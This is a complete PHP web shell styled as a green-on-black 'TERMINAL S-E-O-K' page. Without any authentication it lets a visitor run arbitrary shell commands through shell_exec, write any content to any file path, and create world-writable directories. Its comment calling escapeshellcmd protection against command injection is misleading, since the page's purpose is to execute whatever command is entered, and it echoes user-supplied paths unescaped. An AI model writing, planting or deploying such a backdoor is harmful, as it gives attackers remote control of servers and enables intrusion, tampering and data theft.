<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TERMINAL S-E-O-K</title>
    <style>
        body {
            background-color: #000;
            color: #30f25a;
            font-family: 'Courier New', monospace;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        h1 {
            color: red;
            font-size: 2em;
        }
        form {
            margin: 20px 0;
        }
        input[type="text"], textarea {
            width: 80%;
            padding: 10px;
            border: 1px solid #30f25a;
            background-color: #222;
            color: #30f25a;
            border-radius: 5px;
            font-size: 16px;
        }
        textarea {
            resize: vertical;
            height: 100px;
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            color: #000;
            background-color: #30f25a;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #27a947;
        }
        pre {
            background-color: #222;
            color: #30f25a;
            padding: 10px;
            border: 1px solid #30f25a;
            border-radius: 5px;
            text-align: left;
            overflow-x: auto;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
    </style>
</head>
<body>
    <h1>TERMINAL S-E-O-K</h1>
    <form method="POST" action="">
        <input type="text" name="cmd" placeholder="Enter a shell command (e.g., ls, dir)" required>
        <button type="submit">Execute Command</button>
    </form>
    
    <form method="POST" action="">
        <h3>Create a New File</h3>
        <input type="text" name="filePath" placeholder="Enter file path (e.g., /path/to/file.txt)" required>
        <textarea name="fileContent" placeholder="Enter file content"></textarea>
        <button type="submit" name="createFile">Create File</button>
    </form>

    <form method="POST" action="">
        <h3>Create a New Directory</h3>
        <input type="text" name="dirPath" placeholder="Enter directory path (e.g., /path/to/dir)" required>
        <button type="submit" name="createDir">Create Directory</button>
    </form>

    <h2>Output:</h2>
    <pre>
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!empty($_POST['cmd'])) {
        // Execute shell command
        $command = escapeshellcmd($_POST['cmd']); // Prevent command injection
        $output = shell_exec($command);
        echo htmlspecialchars($output); // Display the output safely
    }

    if (isset($_POST['createFile']) && !empty($_POST['filePath'])) {
        $filePath = trim($_POST['filePath']);
        $fileContent = $_POST['fileContent'] ?? '';
        if (file_put_contents($filePath, $fileContent) !== false) {
            echo "File '$filePath' created successfully.\n";
        } else {
            echo "Failed to create file '$filePath'.\n";
        }
    }

    if (isset($_POST['createDir']) && !empty($_POST['dirPath'])) {
        $dirPath = trim($_POST['dirPath']);
        if (!is_dir($dirPath) && mkdir($dirPath, 0777, true)) {
            echo "Directory '$dirPath' created successfully.\n";
        } else {
            echo "Failed to create directory '$dirPath' or it already exists.\n";
        }
    }
}
?>
    </pre>
</body>
</html>
